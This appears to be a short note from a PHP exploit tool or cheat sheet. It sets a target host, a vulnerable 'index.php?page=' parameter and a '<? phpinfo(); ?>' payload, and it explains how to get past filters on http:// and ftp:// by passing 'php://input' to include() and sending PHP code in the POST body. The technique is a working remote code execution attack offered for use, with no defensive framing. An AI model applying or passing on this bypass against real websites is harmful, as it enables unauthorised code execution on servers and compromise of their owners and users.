target server = "www.exemple.com"
file = "index.php?page="
exec = "<? phpinfo(); ?>"

Explaination
��������������
You can bypassing filter protection who parse http:// or ftp:// ...
"php://input" allows to put data in the function include() by sending a request with code php in POST methode.  


